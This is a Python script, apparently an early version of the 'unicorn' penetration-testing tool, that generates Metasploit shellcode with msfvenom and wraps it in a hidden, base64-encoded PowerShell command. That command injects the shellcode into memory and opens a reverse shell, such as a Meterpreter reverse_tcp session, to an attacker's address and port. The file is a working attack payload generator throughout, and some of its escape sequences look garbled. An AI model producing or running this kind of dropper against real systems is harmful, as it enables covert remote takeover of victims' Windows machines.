import base64,re,subprocess,sys

# generate base shellcode
def generate_shellcode(payload,ipaddr,port):
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s c" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("n", "")
    data = data.replace("buf=", "")
    data = data.rstrip()
    # return data
    return data

def format_payload(payload, ipaddr, port):

    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port)
    shellcode = shellcode.rstrip()
    # sub in x for 0x
    shellcode = re.sub("\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger mesh and write out data
    mesh = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        mesh = mesh + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + mesh + ","
            mesh = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]
    
    # one line shellcode injection with native x86 shellcode
    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
    print "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
    #print powershell_code


try:
    payload = sys.argv[1]
    ipaddr = sys.argv[2]
    port = sys.argv[3]
    format_payload(payload,ipaddr,port)
except IndexError:

    print r"""
              ,_
                 _  `  )  ,
                 `|  / |_/  
       .-. ,    _/  `   '     |/
       _> |,_'> ______        <__,
      `      ,`'`      `'.       /__  ,
       / _   /)`           ',       <_/|
      `/ ,; '     ,                /_,
        )   | /|     |        |       ` /
            | b/    /    ;    /       .'
            |    _.'|   ;     |      /__,
            |    /  | .'      |        /
            |, _   |         |     _.'
             | 7/  / '.. .'      /_ ,     ,_   ,
                `  ;            |    /       |` /
                   |              <'     ,_   Y |/
          .-.      |             -'       >`| `   <__,
         (.-.`'--''        ..            '-.        / ,
         /   `'---'''`.   `    `'. '.              .'_/|
           ,_'-.._.                 '.            `' _/
           `""-._                   '.       ;     <   _,
            \__   `-;-'                 '.    |      _//
              _`,                          .'        <
              /                           /       ;.-'`
              '-==='     '.        ;          ;      <__,
                           `'.    .`       ,  |-.  ,__.'
                              `'-.       ,;'  ;  '.
                               /`      .;;'  ;     `
                             /`           _.'

                            |       _.--'`
                                 (`(
                                   
                                   '.'.
                              .` ,.  )  )
                           .'`. '_.-'.-'
                      _,-'` _.-'`_.-`
                    .'  _.'`.-`
                    '---` `--`

"""
	print "Real quick down and dirty for native x86 powershell on any platform"
	print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com"
    print "Happy Unicorns."
	print "n"
    print "Usage: python unicorn.py payload reverse_ipaddr port"
    print "Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"
